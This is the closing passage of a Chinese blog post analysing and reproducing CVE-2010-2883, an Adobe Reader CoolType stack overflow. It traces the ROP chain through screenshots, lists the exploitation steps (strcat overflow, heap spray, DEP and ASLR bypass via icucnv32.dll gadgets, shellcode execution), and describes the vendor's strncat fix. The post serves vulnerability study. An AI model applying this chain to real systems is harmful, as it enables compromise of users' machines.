<p><img src="/CVE-2010-2883分析复现/36.png" alt></p>
<p>之后跳转到4A802AB1</p>
<p><img src="/CVE-2010-2883分析复现/37.png" alt></p>
<p>执行完pop ebp，ebp的值变为0x8</p>
<p><img src="/CVE-2010-2883分析复现/38.png" alt></p>
<p>跳转到4A80A8A6</p>
<p><img src="/CVE-2010-2883分析复现/39.png" alt></p>
<p>指向了一个函数的实现模块</p>
<p><img src="/CVE-2010-2883分析复现/40.png" alt></p>
<p>用CreateFileMappingA，创建文件映射对象,然后去执行MapViewOfFile，将一个文件映射对象映射到当前程序的地址空间</p>
<p><img src="/CVE-2010-2883分析复现/41.png" alt></p>
<p>之后调用memcpy</p>
<p><img src="/CVE-2010-2883分析复现/42.png" alt></p>
<p>参数如下图</p>
<p><img src="/CVE-2010-2883分析复现/43.png" alt></p>
<p>继续执行到此处，这里将要执行的ShellCode写入到MapViewOfFile返回的地址，因为这段内存是可读可写的，所以就绕过了DEP的保护由于构造的ROP链指令均位于不受ASLR保护的icucnv32.dll模块，因此也绕过了ASLR，之后执行shellcode。</p>
<p><img src="/CVE-2010-2883分析复现/44.png" alt></p>
<h2 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h2><p>1.获取SING表的入口地址<br>2.使用strcat函数将unique和ebp拼接造成溢出<br>3.将返回地址覆盖为0x4A82A714<br>4.之后调用0012E6D0(call命令之前eax的值)<br>5.调整ebp，跳回构造函数的返回地址0x4A82A714<br>6.修改esp为0x0C0C0C0C<br>7.利用JavaScript实现HeapSpray<br>8.利用ROP链执行CreateFileA<br>9.利用ROP链执行CreateFileMappingA，将文件映射到一块可读可写可执行的内存空间<br>10.利用ROP链执行memcpy将shellcode写入MapViewOfFile返回的地址，绕过DEP<br>11.执行shellcode</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载新版本AdobeReader提取CoolType.dll定位到相同的位置，就不再调用strcat函数了，替换的函数获取了字段的长度，并判断是否超出限制，如果超出限制就用strncat限制了拷贝的字节数。</p>
<p><strong>参考</strong><br>《漏洞战争》<br><a href="https://www.52pojie.cn/thread-974408-1-1.html#26467205_%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" target="_blank" rel="noopener">https://www.52pojie.cn/thread-974408-1-1.html#26467205_%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99</a></p>
	
		</div>
		
		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>

		<!-- relate post, comment...-->
		<div class="investment-container">
			<div class="investment-header">
				<div class="investment-title-1">
					<div class="on">相关文章</div>
					<div>评论</div>
					<div>分享</div>
				</div>
				<div class="investment-title-2">	            
					
	<span>
		<a id="totop-post-page">返回顶部</a>
		
			<a href="/BUUCTF逆向刷题.html" title="BUUCTF逆向刷题" rel="prev">
				&laquo;上一篇
			</a>
		
		
			<a href="/GXYCTF逆向部分wp.html" title="GXYCTF逆向部分wp" rel="next">
				下一篇&raquo;
			</a>
			
	</span>


      		
				</div>	
			</div>
			
			<div class="investment-content">
				<div class="investment-content-list">
					

<div class="relate-post">
	
		<ul>
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/Alloc-to-Stack-Arbitary-Alloc.html" title="Alloc to Stack&Arbitary Alloc">
								Alloc to Stack&Arbitary Alloc			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 14日, 2020				
							</p>
							<p class="relate-post-content">
								Alloc to Stack和Arbitary Alloc都利用了fastbin链表的特性。


Alloc To Stack利用了fastbin链表的特性。当前的chunk的fd指向下一个chunk。Alloc To Stack核心...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/Alloc-to-Stack-Arbitary-Alloc.html" title="Alloc to Stack&Arbitary Alloc">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="Alloc to Stack&amp;Arbitary Alloc"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/House-of-Spirit.html" title="House of Spirit">
								House of Spirit			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								三月 4日, 2020				
							</p>
							<p class="relate-post-content">
								House of Spirit针对fastbin,也是fastbin attach的一种。核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。


原理House of Spi...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/House-of-Spirit.html" title="House of Spirit">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="House of Spirit"/>
							</a>
						</div>
					</li>												
			
					<li>
						<div class="relate-post-text">
							<a class="relate-post-title" href="/Fastbin-Double-Free.html" title="Fastbin Double Free">
								Fastbin Double Free			
							</a>
							<p class="relate-post-date">
								<i class="fa fa-calendar"></i>
								二月 4日, 2020				
							</p>
							<p class="relate-post-content">
								double free 是任意地址写的一种技巧，指堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，


利用条件Fastbin Double Free 能够成功利用主...
							</p>
						</div>

						<div class="relate-post-cover">
							<a href="/Fastbin-Double-Free.html" title="Fastbin Double Free">				
								
								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="Fastbin Double Free"/>
							</a>
						</div>
					</li>												
			
		</ul>
	
</div>	
				</div>
				<div class="investment-content-list">
					<div class="layout-comment">

	
		<div class="config-info">
			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
		</div>	
	

</div>
				</div>
				<div class="investment-content-list">
					<div class="layout-share">
	
	

		
			
			<!-- socialShare share -->
			<div class="social-share"></div>

<!--  css & js -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
			
		
		
	
</div>


				</div>
			</div>	
		</div>
	</div>
</div>

<!-- show math formula -->



	 
	<script src="/plugin/clipboard/clipboard.js"></script>
	<script>
		// Copy code !
	    function preprocessing() {
	        $("#article-content .highlight").each(function() {
	            $(this).wrap('<div id="post-code"></div>');
	        })

	        $("#article-content #post-code").each(function() {
	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
	        })

	        $("#article-content .copy-nav").each(function() {
	            let languageClass = $(this).next().attr('class'),
	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?

	            $(this).find('.code-language').text(language);
	            $(this).append('<span class="copy-btn icon-paste"></span>');
	        });
	    }

		function copy() {
		    $('#article-content #post-code').each(function(i) {
		        let codeCopyId = 'codeCopy-' + i;

		        let codeNode = $(this).find('.code'),
		            copyButton = $(this).find('.copy-btn');

		        codeNode.attr('id', codeCopyId);
		        copyButton.attr('data-clipboard-target-id', codeCopyId);
		    })
   
			let clipboard = new ClipboardJS('.copy-btn', {
					target: function(trigger) {
						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
					}
		      	});

			//pure js
			function showTooltip(elem, msg) {		   
				elem.setAttribute('aria-label', msg);
				elem.setAttribute('class', 'copy-btn icon-clipboard1');
				setTimeout(function() {
					elem.setAttribute('class', 'copy-btn icon-paste');
				}, 2000);
			}

			clipboard.on('success', function(e) {
			    e.clearSelection();
			    console.info('Action:', e.action);		   
			    console.info('Trigger:', e.trigger);
			    showTooltip(e.trigger, 'Copied!');   
			});
			
			clipboard.on('error', function(e) {
			    console.error('Action:', e.action);
			    console.error('Trigger:', e.trigger);
			});
		}
		
		(function copyCode(){
			if ($('.layout-post').length) {
			    preprocessing();
			    copy();
			} 
		})();
	</script>





<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
<script src="/plugin/fancybox/jquery.fancybox.js"></script>

<script type="text/javascript">
	(function gallerySet(){
		let titleID = $('.article-title a'),
			imageID = $('.article-content img'),
			videoID = $('.article-content video');
		
		let postTitle = titleID.text() ? titleID.text() : "No post title!";
		
		imageID.each(function() {
			let imgPath = $(this).attr('src'),
				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
		});
		
		videoID.each(function() {
			let videoPath = $(this).attr('src');
		
			//给每个匹配的<img>元素打包, 即添加父元素<a>
			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
		});
		
		//TODO：支持html5 video

		if($('#layout-post').length) {
			$('[data-fancybox="gallery"]').fancybox({
				loop: true,
				buttons: [
					"zoom",
					"share",
					"slideShow",
					"fullScreen",
					//"download",
					"thumbs",
					"close"
				],
				protect: true
			});
		}
	})();
</script>
		</main>

		<!--footer-->
		<footer>
	<div id="navigation-show">
		<ul id="global-nav">
	
		<li class="menu-home">
			<a href="/" class="menu-item-home" target="_blank">主页</a>
		</li>
		
	
		<li class="menu-archive">
			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
		</li>
		
	
		<li class="menu-tags">
			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
		</li>
		
	
		<li class="menu-about">
			<a href="/about" class="menu-item-about" target="_blank">关于</a>
		</li>
		
	

	
</ul>
	</div>

	<div class="copyright">
		<p>
			 
				&copy;2019 - 2020, content by Thriumph. All Rights Reserved.
			
			
				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
			
		</p>
		<p>
			

	<!-- busuanzi -->
	<!-- busuanzi -->

		
	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
	

		<span id="busuanzi_container_page_pv">
	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
		</span>

	




			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
		</p>
	</div>		
</footer>
		
	<!-- Local or hitokoto! -->

	<script src="/plugin/motto/motto.js"></script>
	
	<script type="text/javascript">
		(function motto(){
			let mottoText = getMingYanContent().split('</br> - </br>'),
			
			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
			
			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
			
			mottoTextContent = mottoTextContent.trim().substring(0, 100);
		
			$("#motto-content").html( mottoTextContent);
			$("#motto-author").html( mottoTextFrom  );
		})();	
	</script>	



<!-- love effect -->

	<script src="/plugin/love/love.js"></script>


<!-- back to top -->

	<div id="totop">
	<span class="icon-circle-up"></span>
</div>



<!-- site analysis -->


	<!-- site-analysis -->
	
	<script>
		var _hmt = _hmt || [];
		(function() {
			var hm = document.createElement("script");
			hm.src = "//hm.baidu.com/hm.js?";
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(hm, s);
		})();
	</script>

	
	<script src="//s6.cnzz.com/stat.php?id=&web_id=" type="text/javascript"></script>

	
	
	
 

<!-- leancloud -->


	<!-- leancloud -->
	<!--
	时间：2018-11-27
	描述：
		文章访问量：visitors
		文章喜欢量：likes	
		文章排行榜：topNPost
		其他得说明：
			01-Cookie相关的函数 
				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
			02-visitors相关的函数 
				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
			03-topNPost相关的函数
				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
			04-likes相关的函数，
				参考了01 & 02进行简单的设计与实现
-->


  <script src="/plugin/leancloud/av-min.js"></script>
<script src="/js/leancloud-count.js"></script>

	

  


<script src="/plugin/chinese/chinese.js"></script>
<script src="/plugin/imagelazyloader/yall.min.js"></script>
<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
<script src="/plugin/resizediv/resizediv.js"></script>
<script src="/js/main.js"></script>
	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-20,"vOffset":80},"mobile":{"show":false}});</script></body>	
</html>